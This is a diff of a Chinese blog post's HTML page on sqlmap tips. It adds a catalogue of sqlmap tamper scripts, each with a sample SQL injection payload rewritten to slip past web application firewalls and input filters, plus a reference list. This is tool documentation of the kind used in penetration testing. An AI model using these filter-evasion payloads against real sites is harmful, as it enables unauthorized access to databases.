@@ -11,7 +11,7 @@
 <meta property="og:url" content="http://nanshihui.github.io/2016/02/25/sqlmaptips/index.html">
 <meta property="og:site_name" content="Sherwel-Blog">
 <meta property="og:description" content="前言通过在乌云网上出现的很多SQL注入漏洞，因此来总结一下，大致使用SQLMAP所遇到的参数。">
-<meta property="og:updated_time" content="2016-02-25T02:11:44.439Z">
+<meta property="og:updated_time" content="2016-02-25T06:18:24.007Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqlmap常用技巧整理">
 <meta name="twitter:description" content="前言通过在乌云网上出现的很多SQL注入漏洞，因此来总结一下，大致使用SQLMAP所遇到的参数。">
@@ -253,6 +253,170 @@
 <p>　　支持的探测方式如下：</p>
 <p>　　B: Boolean-based blind SQL injection（布尔型注入）<br>　　E: Error-based SQL injection（报错型注入）<br>　　U: UNION query SQL injection（可联合查询注入）<br>　　S: Stacked queries SQL injection（可多语句查询注入）<br>　　T: Time-based blind SQL injection（基于时间延迟注入）</p>
 <h3 id="u2013tamper"><a href="#u2013tamper" class="headerlink" title="–tamper"></a>–tamper</h3><p>　　有些时候网站会过滤掉各种字符，可以用tamper来解决（对付某些waf时也有成效）<br>　　–tamper=”space2comment.py”<br>　　理论是用/**/代替空格，当然temper的选项还有很多</p>
+<ul>
+<li>apostrophemask.py</li>
+</ul>
+<p>　　作用：用utf8代替引号</p>
+<ul>
+<li>equaltolike.py</li>
+</ul>
+<p>　　作用：like 代替等号</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT * FROM users WHERE id=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Output: SELECT * FROM users WHERE id LIKE <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>space2dash.py</li>
+</ul>
+<p>　　作用：绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）<br>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 9227=9227'</span>) <span class="string">'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>greatest.py</li>
+</ul>
+<p>　　作用：绕过过滤’&gt;’ ,用GREATEST替换大于号。<br>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND A &gt; B'</span>) <span class="string">'1 AND GREATEST(A,B+1)=A'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>space2hash.py</li>
+</ul>
+<p>　　作用：空格替换为#号 随机字符串 以及换行符</p>
+<p>　　Example:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="number">1</span> AND <span class="number">9227</span>=<span class="number">9227</span></span><br><span class="line"> Output: <span class="number">1</span>%<span class="number">23</span>PTTmJopxdWJ%<span class="number">0</span>AAND%<span class="number">23</span>cW<span class="built_in">fc</span>VRPV%<span class="number">0</span>A9227=<span class="number">9227</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>apostrophenullencode.py</li>
+</ul>
+<p>　　作用：绕过过滤双引号，替换字符和双引号。<br>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper(<span class="string">"1 AND '1'='1"</span>) <span class="string">'1 AND %00%271%00%27=%00%271'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>halfversionedmorekeywords.py</li>
+</ul>
+<p>　　作用：当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">"value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() </span><br><span class="line">AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa"</span>) </span><br><span class="line">　<span class="string">"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>space2morehash.py</li>
+</ul>
+<p>　　作用：空格替换为 #号 以及更多随机字符串 换行符</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="number">1</span> AND <span class="number">9227</span>=<span class="number">9227</span> </span><br><span class="line"></span><br><span class="line">Output: <span class="number">1</span>%<span class="number">23</span>PTTmJopxdWJ%<span class="number">0</span>AAND%<span class="number">23</span>cW<span class="built_in">fc</span>VRPV%<span class="number">0</span>A9227=<span class="number">9227</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>appendnullbyte.py</li>
+</ul>
+<p>　作用：在有效负荷结束位置加载零字节字符编码<br>　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 1=1'</span>) <span class="string">'1 AND 1=1%00'</span></span><br></pre></td></tr></table></figure></p>
+<p>　　常用于access</p>
+<ul>
+<li>ifnull2ifisnull.py</li>
+</ul>
+<p>　作用：绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’<br>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'IFNULL(1, 2)'</span>) <span class="string">'IF(ISNULL(1),2,1)'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>space2mssqlblank.py(mssql)</li>
+</ul>
+<p>　　作用：空格替换为其它空符号</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT id FROM users * </span><br><span class="line">Output: SELECT%<span class="number">08</span>id%<span class="number">02</span>FROM%<span class="number">0</span>Fusers</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>base64encode.py</li>
+</ul>
+<p>　　作用：用base64编码替换 Example: (“1’ AND SLEEP(5)#”) ‘MScgQU5EIFNMRUVQKDUpIw==’ Requirement: all</p>
+<ul>
+<li>space2mssqlhash.py</li>
+</ul>
+<p>　　作用：替换空格</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 9227=9227'</span>) <span class="string">'1%23%0AAND%23%0A9227=9227'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>modsecurityversioned.py</li>
+</ul>
+<p>　　作用：过滤空格，包含完整的查询版本注释</p>
+<p>　　Example:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 2&gt;1--'</span>) <span class="string">'1 /*!30874AND 2&gt;1*/--'</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>space2mysqlblank.py</li>
+</ul>
+<p>　　作用：空格替换其它空白符号(mysql)</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　Input: SELECT id FROM users </span><br><span class="line"></span><br><span class="line">　Output: SELECT%<span class="number">0</span>Bid%<span class="number">0</span>BFROM%A0users</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>between.py</li>
+</ul>
+<p>　　作用：用between替换大于号（&gt;）</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND A &gt; B--'</span>) <span class="string">'1 AND A NOT BETWEEN 0 AND B--'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>space2mysqldash.py</li>
+</ul>
+<p>　　作用：替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</p>
+<p>注：之前有个mssql的 这个是mysql的</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 9227=9227'</span>) <span class="string">'1--%0AAND--%0A9227=9227'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>multiplespaces.py</li>
+</ul>
+<p>　　作用：围绕SQL关键字添加多个空格</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 UNION SELECT foobar'</span>) <span class="string">'1 UNION SELECT foobar'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>：space2plus.py</li>
+</ul>
+<p>　　作用：用+替换空格</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'SELECT id FROM users'</span>) <span class="string">'SELECT+id+FROM+users'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>bluecoat.py</li>
+</ul>
+<p>　　作用：代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'SELECT id FROM users where id = 1'</span>) <span class="string">'SELECT%09id FROM users where id LIKE 1'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>nonrecursivereplacement.py</li>
+</ul>
+<p>　　双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 UNION SELECT 2--'</span>) <span class="string">'1 UNIOUNIONN SELESELECTCT 2--'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>space2randomblank.py</li>
+</ul>
+<p>　　作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'SELECT id FROM users'</span>) <span class="string">'SELECT%0Did%0DFROM%0Ausers'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>sp_password.py</li>
+</ul>
+<p>　　作用：追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 9227=9227-- '</span>) <span class="string">'1 AND 9227=9227-- sp\_password'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>chardoubleencode.py</li>
+</ul>
+<p>　　作用: 双url编码(不处理以编码的)</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT FIELD FROM%<span class="number">20</span>TABLE </span><br><span class="line"></span><br><span class="line">Output: %<span class="number">2553</span>%<span class="number">2545</span>%<span class="number">254</span>c%<span class="number">2545</span>%<span class="number">2543</span>%<span class="number">2554</span>%<span class="number">2520</span>%<span class="number">2546</span>%<span class="number">2549</span>%<span class="number">2545</span>%<span class="number">254</span>c%<span class="number">2544</span>%<span class="number">2520</span>%<span class="number">2546</span>%<span class="number">2552</span>%<span class="number">254</span>f%<span class="number">254</span>d%<span class="number">2520</span>%<span class="number">2554</span>%<span class="number">2541</span>%<span class="number">2542</span>%<span class="number">254</span>c%<span class="number">2545</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>unionalltounion.py</li>
+</ul>
+<p>　　作用：替换UNION ALL SELECT UNION SELECT</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'-1 UNION ALL SELECT'</span>) <span class="string">'-1 UNION SELECT'</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>charencode.py</li>
+</ul>
+<p>　　作用：url编码<br>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT FIELD FROM%<span class="number">20</span>TABLE</span><br><span class="line"></span><br><span class="line">Output: %<span class="number">53</span>%<span class="number">45</span>%<span class="number">4</span>c%<span class="number">45</span>%<span class="number">43</span>%<span class="number">54</span>%<span class="number">20</span>%<span class="number">46</span>%<span class="number">49</span>%<span class="number">45</span>%<span class="number">4</span>c%<span class="number">44</span>%<span class="number">20</span>%<span class="number">46</span>%<span class="number">52</span>%<span class="number">4</span>f%<span class="number">4</span>d%<span class="number">20</span>%<span class="number">54</span>%<span class="number">41</span>%<span class="number">42</span>%<span class="number">4</span>c%<span class="number">45</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>randomcase.py</li>
+</ul>
+<p>　　作用：随机大小写 Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: INSERT</span><br><span class="line">Output: InsERt</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>unmagicquotes.py</li>
+</ul>
+<p>　　作用：宽字符绕过 GPC addslashes</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="number">1</span>′ AND <span class="number">1</span>=<span class="number">1</span> </span><br><span class="line"></span><br><span class="line">Output: <span class="number">1</span>%bf%<span class="number">27</span> AND <span class="number">1</span>=<span class="number">1</span>–%<span class="number">20</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>randomcomments.py</li>
+</ul>
+<p>　　作用：用/**/分割sql关键字</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘INSERT’ becomes ‘IN//S//ERT’</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>charunicodeencode.py</li>
+</ul>
+<p>　　作用：字符串 unicode 编码</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT FIELD%<span class="number">20</span>FROM TABLE </span><br><span class="line"></span><br><span class="line">Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>securesphere.py</li>
+</ul>
+<p>　　作用：追加特制的字符串</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 1=1'</span>) <span class="string">"1 AND 1=1 and '0having'='0having'"</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>versionedmorekeywords.py</li>
+</ul>
+<p>　　作用：注释绕过</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="number">1</span> UNION ALL SELECT NULL, NULL, CONCAT(CHAR(<span class="number">58</span>,<span class="number">122</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">58</span>),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">58</span>))<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"> Output: <span class="number">1</span>/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(<span class="number">58</span>,<span class="number">122</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">58</span>),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(<span class="number">32</span>)),/*!CHAR*/(<span class="number">58</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">58</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>space2comment.py<br>　　作用：Replaces space character (‘ ‘) with comments ‘/**/’</li>
+</ul>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT id FROM users </span><br><span class="line"></span><br><span class="line">Output: SELECT//id//FROM/**/users</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>halfversionedmorekeywords.py</li>
+</ul>
+<p>　　作用：关键字前加注释</p>
+<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: value’ UNION ALL SELECT CONCAT(CHAR(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), NULL, NULL<span class="comment"># AND ‘QDWa’='QDWa </span></span><br><span class="line"></span><br><span class="line">Output: value’/*!<span class="number">0</span>UNION/*!<span class="number">0</span>ALL/*!<span class="number">0</span>SELECT/*!<span class="number">0</span>CONCAT(/*!<span class="number">0</span>CHAR(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),/*!<span class="number">0</span>IFNULL(CAST(/*!<span class="number">0</span>CURRENT_USER()/*!<span class="number">0</span>AS/*!<span class="number">0</span>CHAR),/*!<span class="number">0</span>CHAR(<span class="number">32</span>)),/*!<span class="number">0</span>CHAR(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), NULL, NULL<span class="comment">#/*!0AND ‘QDWa’='QDWa</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="u6709_u65F6_u53D1_u73B0_u8DD1_u51FA_u7684_u6570_u636E_u90FD_u662F_u6BEB_u65E0_u610F_u4E49_u7684_u5B57_u7B26"><a href="#u6709_u65F6_u53D1_u73B0_u8DD1_u51FA_u7684_u6570_u636E_u90FD_u662F_u6BEB_u65E0_u610F_u4E49_u7684_u5B57_u7B26" class="headerlink" title="有时发现跑出的数据都是毫无意义的字符"></a>有时发现跑出的数据都是毫无意义的字符</h3><p>解决方案：</p>
 <p>　　a）SQLMAP会提示你加–hex或者–no-cast，有时会有帮助<br>　　b）如果你用的是time-based注射，建议增加延时–time-sec等参数，即使你的网速比较好，但是服务器可能遇见各种奇怪环境<br>　　c）增加level的数值</p>
 <h3 id="u66B4_u529B_u731C_u8868"><a href="#u66B4_u529B_u731C_u8868" class="headerlink" title="暴力猜表"></a>暴力猜表</h3><p>　　针对access站可以构造common-tables.txt</p>
@@ -261,6 +425,7 @@
 <p>　　解决方案：减少time-out进行检测，在跑数据时改回time-out</p>
 <h3 id="u63D0_u793Apossible_integer_casting_detected"><a href="#u63D0_u793Apossible_integer_casting_detected" class="headerlink" title="提示possible integer casting detected"></a>提示possible integer casting detected</h3><p>　　如果是在手工测试，建议到这里可以停止了，节省时间。</p>
 <p>　　如果是在扫描器扫描的盲注，那么到这里坚决无视警告继续下去。</p>
+<h3 id="u53C2_u8003_u6587_u732E_uFF1A"><a href="#u53C2_u8003_u6587_u732E_uFF1A" class="headerlink" title="参考文献："></a>参考文献：</h3><p>　　<a href="http://drops.wooyun.org/tools/4760" target="_blank" rel="external">http://drops.wooyun.org/tools/4760</a><br>　　<a href="http://drops.wooyun.org/tips/143" target="_blank" rel="external">http://drops.wooyun.org/tips/143</a><br>　　<a href="http://www.2cto.com/Article/201306/223082.html" target="_blank" rel="external">http://www.2cto.com/Article/201306/223082.html</a><br>　　<a href="http://drops.wooyun.org/tips/5254" target="_blank" rel="external">http://drops.wooyun.org/tips/5254</a></p>
 
       
     </div>
@@ -272,7 +437,7 @@
         <p><span>本文标题:</span><a href="/2016/02/25/sqlmaptips/">sqlmap常用技巧整理</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Sherwel 的个人博客">Sherwel</a></p>
         <p><span>发布时间:</span>2016年02月25日 - 09时15分</p>
-        <p><span>最后更新:</span>2016年02月25日 - 10时11分</p>
+        <p><span>最后更新:</span>2016年02月25日 - 14时18分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/02/25/sqlmaptips/" title="sqlmap常用技巧整理">http://nanshihui.github.io/2016/02/25/sqlmaptips/</a>
             <span class="copy-path" data-clipboard-text="原文: http://nanshihui.github.io/2016/02/25/sqlmaptips/　　作者: Sherwel" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -302,7 +467,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#intro"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u57FA_u672C_u7ED3_u6784"><span class="toc-number">2.</span> <span class="toc-text">基本结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u53C2_u6570_u89E3_u91CA"><span class="toc-number">3.</span> <span class="toc-text">参数解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u661F_u53F7"><span class="toc-number">3.1.</span> <span class="toc-text">星号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u2013data"><span class="toc-number">3.2.</span> <span class="toc-text">–data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#p"><span class="toc-number">3.3.</span> <span class="toc-text">-p</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u2013level"><span class="toc-number">3.4.</span> <span class="toc-text">–level</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u2013random-agent"><span class="toc-number">3.5.</span> <span class="toc-text">–random-agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u2013technique"><span class="toc-number">3.6.</span> <span class="toc-text">–technique</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u2013tamper"><span class="toc-number">3.7.</span> <span class="toc-text">–tamper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u6709_u65F6_u53D1_u73B0_u8DD1_u51FA_u7684_u6570_u636E_u90FD_u662F_u6BEB_u65E0_u610F_u4E49_u7684_u5B57_u7B26"><span class="toc-number">3.8.</span> <span class="toc-text">有时发现跑出的数据都是毫无意义的字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u66B4_u529B_u731C_u8868"><span class="toc-number">3.9.</span> <span class="toc-text">暴力猜表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u663E_u793Aunable_to_connect_to_the_target_url"><span class="toc-number">3.10.</span> <span class="toc-text">显示unable to connect to the target url</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u63D0_u793Apossible_integer_casting_detected"><span class="toc-number">3.11.</span> <span class="toc-text">提示possible integer casting detected</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#intro"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u57FA_u672C_u7ED3_u6784"><span class="toc-number">2.</span> <span class="toc-text">基本结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u53C2_u6570_u89E3_u91CA"><span class="toc-number">3.</span> <span class="toc-text">参数解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u661F_u53F7"><span class="toc-number">3.1.</span> <span class="toc-text">星号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u2013data"><span class="toc-number">3.2.</span> <span class="toc-text">–data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#p"><span class="toc-number">3.3.</span> <span class="toc-text">-p</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u2013level"><span class="toc-number">3.4.</span> <span class="toc-text">–level</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u2013random-agent"><span class="toc-number">3.5.</span> <span class="toc-text">–random-agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u2013technique"><span class="toc-number">3.6.</span> <span class="toc-text">–technique</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u2013tamper"><span class="toc-number">3.7.</span> <span class="toc-text">–tamper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u6709_u65F6_u53D1_u73B0_u8DD1_u51FA_u7684_u6570_u636E_u90FD_u662F_u6BEB_u65E0_u610F_u4E49_u7684_u5B57_u7B26"><span class="toc-number">3.8.</span> <span class="toc-text">有时发现跑出的数据都是毫无意义的字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u66B4_u529B_u731C_u8868"><span class="toc-number">3.9.</span> <span class="toc-text">暴力猜表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u663E_u793Aunable_to_connect_to_the_target_url"><span class="toc-number">3.10.</span> <span class="toc-text">显示unable to connect to the target url</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u63D0_u793Apossible_integer_casting_detected"><span class="toc-number">3.11.</span> <span class="toc-text">提示possible integer casting detected</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u53C2_u8003_u6587_u732E_uFF1A"><span class="toc-number">3.12.</span> <span class="toc-text">参考文献：</span></a></li></ol></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
